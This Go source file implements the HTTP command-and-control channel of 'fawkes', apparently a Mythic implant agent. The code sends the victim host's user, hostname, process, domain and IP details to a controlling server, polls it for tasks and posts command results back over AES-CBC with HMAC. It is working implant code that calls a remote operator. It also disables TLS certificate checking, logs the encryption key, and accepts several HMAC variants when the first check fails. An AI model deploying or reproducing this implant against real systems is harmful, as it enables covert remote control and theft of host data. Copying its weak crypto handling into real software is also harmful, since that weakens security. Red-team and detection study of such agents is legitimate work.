package http

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"fawkes/pkg/structs"
)

// HTTPProfile handles HTTP communication with Mythic
type HTTPProfile struct {
	BaseURL       string
	UserAgent     string
	EncryptionKey string
	MaxRetries    int
	SleepInterval int
	Jitter        int
	Debug         bool
	Endpoint      string
	client        *http.Client
	CallbackUUID  string // Store callback UUID from initial checkin
}

// NewHTTPProfile creates a new HTTP profile
func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, endpoint string) *HTTPProfile {
	profile := &HTTPProfile{
		BaseURL:       baseURL,
		UserAgent:     userAgent,
		EncryptionKey: encryptionKey,
		MaxRetries:    maxRetries,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		Endpoint:      endpoint,
	}

	// Create HTTP client with reasonable defaults
	profile.client = &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // For testing - should be configurable
			},
		},
	}

	return profile
}

// Checkin performs the initial checkin with Mythic
func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		InternalIP:   agent.InternalIP,
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
		PayloadType:  "fawkes",
		C2Profile:    "http",
	}

	if h.Debug {
		log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			log.Printf("[DEBUG] Checkin message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Send checkin request to configured endpoint
	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	// Read and process the checkin response to extract callback UUID
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read checkin response: %w", err)
	}

	if h.Debug {
		log.Printf("[DEBUG] Checkin response body: %s", string(respBody))
	}

	// Decrypt the checkin response if needed
	var decryptedResponse []byte
	if h.EncryptionKey != "" {
		// Base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}
		
		// Decrypt the response
		decryptedResponse, err = h.decryptResponse(decodedData)
		if err != nil {
			log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respBody
	}

	// Parse the response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
		log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			h.CallbackUUID = callbackStr
			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			h.CallbackUUID = callbackStr
			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
		}
	} else {
		log.Printf("[WARNING] No callback UUID found in checkin response, using payload UUID")
		h.CallbackUUID = agent.PayloadUUID
	}

	return nil
}

// GetTasking retrieves tasks from Mythic
func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
	log.Printf("[DEBUG] GetTasking called for agent %s", agent.PayloadUUID[:8])
	if h.Debug {
		log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.Endpoint)
	}
	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: 1, // Request one task at a time for now
		// Include agent identification for checkin updates
		PayloadUUID: h.getActiveUUID(agent), // Use callback UUID if available
		PayloadType: "fawkes",
		C2Profile:   "http",
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			log.Printf("[DEBUG] Tasking message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	activeUUID := h.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
	if err != nil {
		log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
		return nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)

	if resp.StatusCode != http.StatusOK {
		log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
		return nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
	log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))

	// Decrypt the response if encryption key is provided
	var decryptedData []byte
	if h.EncryptionKey != "" {
		log.Printf("[DEBUG] Decrypting response...")
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			log.Printf("[DEBUG] Failed to base64 decode response: %v", err)
			return nil, fmt.Errorf("failed to decode response: %w", err)
		}
		
		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData)
		if err != nil {
			log.Printf("[DEBUG] Failed to decrypt response: %v", err)
			return nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
		log.Printf("[DEBUG] Decrypted response: %s", string(decryptedData))
	} else {
		log.Printf("[DEBUG] No encryption key, using raw response")
		decryptedData = respBody
	}

	log.Printf("[DEBUG] Attempting to parse response as JSON")

	// Parse the decrypted response - Mythic returns different formats
	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		// If not JSON, might be no tasks
		log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
		return []structs.Task{}, nil
	}

	log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
	for key, _ := range taskResponse {
		log.Printf("[DEBUG] Response contains key: %s", key)
	}

	// Extract tasks from response
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.Task{
						ID:      getString(taskMap, "id"),
						Command: getString(taskMap, "command"),
						Params:  getString(taskMap, "parameters"),
					}
					tasks = append(tasks, task)
				}
			}
		}
	}

	return tasks, nil
}

// decryptResponse decrypts a response from Mythic using the same format as Freyja
func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
	if h.EncryptionKey == "" {
		return encryptedData, nil // No encryption
	}

	log.Printf("[DEBUG] Decryption key (base64): %s", h.EncryptionKey)

	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	log.Printf("[DEBUG] Decoded key length: %d bytes", len(key))
	log.Printf("[DEBUG] Decoded key (hex): %x", key)

	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
	}

	// Extract UUID (first 36 bytes)
	uuidBytes := encryptedData[:36]
	log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))

	// Extract IV (next 16 bytes)
	iv := encryptedData[36:52]

	// Extract HMAC (last 32 bytes)
	hmacBytes := encryptedData[len(encryptedData)-32:]

	// Extract ciphertext (everything between IV and HMAC)
	ciphertext := encryptedData[52 : len(encryptedData)-32]

	log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))
	log.Printf("[DEBUG] Expected total: %d (36+16+%d+32)", 36+16+len(ciphertext)+32, len(ciphertext))

	// Verify HMAC
	mac := hmac.New(sha256.New, key)
	dataForHmac := encryptedData[:len(encryptedData)-32] // Everything except HMAC
	mac.Write(dataForHmac)
	expectedHmac := mac.Sum(nil)

	log.Printf("[DEBUG] HMAC verification:")
	log.Printf("[DEBUG]   Key length: %d", len(key))
	log.Printf("[DEBUG]   Data for HMAC length: %d", len(dataForHmac))
	log.Printf("[DEBUG]   Received HMAC: %x", hmacBytes)
	log.Printf("[DEBUG]   Expected HMAC: %x", expectedHmac)
	log.Printf("[DEBUG]   HMAC match: %v", hmac.Equal(hmacBytes, expectedHmac))

	if !hmac.Equal(hmacBytes, expectedHmac) {
		log.Printf("[DEBUG] Primary HMAC verification failed, trying alternative methods...")
		
		// Try HMAC on just the ciphertext (alternative method)
		mac2 := hmac.New(sha256.New, key)
		mac2.Write(ciphertext)
		expectedHmac2 := mac2.Sum(nil)
		log.Printf("[DEBUG] Alternative HMAC (ciphertext only): %x", expectedHmac2)
		
		if hmac.Equal(hmacBytes, expectedHmac2) {
			log.Printf("[DEBUG] Alternative HMAC method succeeded!")
		} else {
			// Try HMAC on UUID + IV + ciphertext (without UUID in the calculation)
			mac3 := hmac.New(sha256.New, key)
			mac3.Write(encryptedData[36:len(encryptedData)-32]) // IV + ciphertext
			expectedHmac3 := mac3.Sum(nil)
			log.Printf("[DEBUG] Alternative HMAC (IV+ciphertext): %x", expectedHmac3)
			
			if !hmac.Equal(hmacBytes, expectedHmac3) {
				return nil, fmt.Errorf("HMAC verification failed with all methods")
			}
			log.Printf("[DEBUG] Alternative HMAC method 2 succeeded!")
		}
	}

	// Decrypt using AES-CBC
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext length not multiple of block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	padding := int(plaintext[len(plaintext)-1])
	if padding > aes.BlockSize || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}

	for i := len(plaintext) - padding; i < len(plaintext); i++ {
		if plaintext[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding")
		}
	}

	return plaintext[:len(plaintext)-padding], nil
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
	if h.CallbackUUID != "" {
		log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
		return h.CallbackUUID
	}
	log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
	return agent.PayloadUUID
}

// PostResponse sends a response back to Mythic
func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent) error {
	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal response message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			log.Printf("[DEBUG] Response message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
	if err != nil {
		return fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	if h.Debug {
		respBody, _ := io.ReadAll(resp.Body)
		log.Printf("[DEBUG] Post response result: %s", string(respBody))
	}

	return nil
}

// makeRequest is a helper function to make HTTP requests
func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
	url := h.BaseURL + path
	log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))

	var reqBody io.Reader
	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	req, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set headers for Mythic C2
	req.Header.Set("User-Agent", h.UserAgent)
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Accept", "*/*")

	if h.Debug {
		log.Printf("[DEBUG] Making %s request to %s", method, url)
		log.Printf("[DEBUG] Request body: %s", string(body))
	}

	log.Printf("[DEBUG] Executing HTTP client.Do()")
	resp, err := h.client.Do(req)
	if err != nil {
		log.Printf("[DEBUG] HTTP client.Do() failed: %v", err)
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}
	
	log.Printf("[DEBUG] HTTP client.Do() completed successfully, status: %d", resp.StatusCode)
	return resp, nil
}

// getString safely gets a string value from a map
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// encryptMessage encrypts a message exactly like Freyja's AesEncrypt
func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
	if h.EncryptionKey == "" {
		return msg
	}
	
	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
	if err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to decode encryption key: %v", err)
		}
		return msg
	}
	
	// Create AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to create AES cipher: %v", err)
		}
		return msg
	}
	
	// Generate random IV
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to generate IV: %v", err)
		}
		return msg
	}
	
	// Create CBC encrypter
	mode := cipher.NewCBCEncrypter(block, iv)
	
	// Pad the message to block size
	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to pad message: %v", err)
		}
		return msg
	}
	
	// Encrypt the message
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)
	
	// Freyja format: IV + Ciphertext
	ivCiphertext := append(iv, encrypted...)
	
	// Create HMAC of IV + Ciphertext
	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	hmacBytes := hmacHash.Sum(nil)
	
	// Freyja format: IV + Ciphertext + HMAC
	return append(ivCiphertext, hmacBytes...)
}

// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 {
		return nil, fmt.Errorf("invalid blocksize")
	}
	if data == nil || len(data) == 0 {
		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
	}
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...), nil
}